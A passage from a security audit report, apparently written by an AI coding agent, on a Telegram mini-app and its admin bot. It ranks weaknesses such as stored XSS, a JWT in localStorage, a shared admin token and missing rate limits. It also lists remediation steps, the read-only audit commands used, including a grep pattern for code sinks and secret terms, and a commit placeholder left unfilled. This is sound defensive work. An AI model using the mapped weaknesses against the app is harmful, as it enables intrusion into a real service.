22. External media URLs allow tracking/privacy leakage.
23. Admin Bot auth relies only on Telegram user ID, no step-up/2FA.
24. Admin Bot surfaces raw WEB API error detail to Telegram.
25. CORS not explicitly controlled in app; production proxy misconfig risk.
26. Direct frontend WEB API calls bypass same-origin proxy controls.
27. Local TG catalog API is public/no auth.
28. Admin CRUD can publish content with one token/no workflow approval.
29. Proxy logs may include sensitive query values.
30. No dependency vulnerability scanning controls found.

# TOP-20 most critical

1. Stored XSS through `dangerouslySetInnerHTML`.
2. JWT/access token in `localStorage`.
3. Missing CSP.
4. Telegram initData validation delegated/not verifiable.
5. Telegram initData replay protection delegated/not verifiable.
6. Shared static admin token for all admin/upload operations.
7. Admin Bot base URL/token exfiltration risk.
8. Sync base URL/token exfiltration risk.
9. Admin Bot auth only by Telegram user ID/no step-up.
10. No login endpoint rate limiting.
11. No global API/proxy rate limiting.
12. Direct frontend WEB API calls bypass same-origin proxy controls.
13. Client API arbitrary query proxying.
14. Content blocks arbitrary query proxying.
15. Upload lacks magic-byte validation.
16. Missing clickjacking policy.
17. Missing baseline security headers/HSTS.
18. Admin CRUD publish workflow concentration.
19. Public uploads without abuse controls.
20. Missing audit logging for admin mutations.

# Must fix before Production

- Remove/mitigate stored XSS: eliminate unsafe `dangerouslySetInnerHTML` or sanitize via strict allowlist.
- Replace persistent `localStorage` JWT with safer session strategy or in-memory short-lived tokens; at minimum add CSP and token TTL/revocation.
- Add CSP, clickjacking policy, nosniff, referrer policy, permissions policy and HSTS at Node/proxy layer.
- Confirm and test WEB backend Telegram initData validation, auth_date freshness and replay protection.
- Add rate limiting to login/API/content/status/debug endpoints at ingress and/or Node.
- Protect or disable `/debug/runtime-port` and private status endpoints in production.
- Add allowlists/HTTPS-only validation for `WEB_CONTENT_API_BASE_URL` and related privileged service URLs.
- Split/rotate admin tokens; add scoped tokens, audit logs and per-action permissions.
- Validate uploads by real file content and serve with nosniff/scanning.
- Verify WEB API IDOR/Broken Access Control/CORS/CSRF externally.

# Can fix later / lower priority

- Reduce public `/api/tg/status` detail if not exposed to untrusted internet.
- Media proxy/CDN allowlist to reduce tracking.
- More granular cache headers for immutable assets.
- Dependency scanning automation if external CI already covers it.
- More detailed production runbooks for reverse proxy security headers.

# Checks performed

Commands run during audit:

```bash
pwd && find .. -name AGENTS.md -print
find . -maxdepth 2 -type f \( -name 'architecture.md' -o -name 'backend.md' -o -name 'frontend.md' -o -name 'state-management.md' -o -name 'request-flow.md' -o -name 'data-flow.md' -o -name 'infrastructure.md' \) -print
rg --files -g '!node_modules' -g '!vendor' -g '!dist' -g '!build'
cat architecture.md backend.md frontend.md state-management.md request-flow.md data-flow.md infrastructure.md
rg -n "(innerHTML|dangerouslySetInnerHTML|eval\(|new Function|localStorage|sessionStorage|document\.cookie|Authorization|Bearer|initData|telegram|jwt|token|password|secret|csrf|cors|Access-Control|upload|readFile|sendFile|path\.join|resolve\(|exec\(|spawn\(|subprocess|os\.system|SELECT|INSERT|UPDATE|DELETE|params|query|redirect|location\.href|window\.open|postMessage|debug|runtime|dotenv|process\.env|VITE_)" -g '!node_modules' -g '!dist' -g '!package-lock.json' .
sed -n '1,1240p' telegram-mini-app/server/production-server.js
sed -n '1,980p' telegram-mini-app/src/api/client.ts
sed -n '1,220p' telegram-mini-app/src/telegram/webapp.ts
sed -n '1,720p' telegram-mini-app/backend/telegram_catalog/app.py
sed -n '1,220p' admin_bot/admin_bot/config.py
sed -n '1,260p' admin_bot/admin_bot/web_api.py
sed -n '1,220p' telegram-mini-app/src/components/ContentText.tsx
rg -n "dangerouslySetInnerHTML|innerHTML|href=|src=|window\.location|localStorage|sessionStorage" telegram-mini-app/src -g '!*.d.ts'
```

# Final counts and commit placeholders

- Количество найденных проблем: 30.
- Hash коммита: будет указан после commit.
- Commit message: `docs: add security audit`.
- Подтверждение: код проекта не изменялся; добавлен только `security-audit.md`.
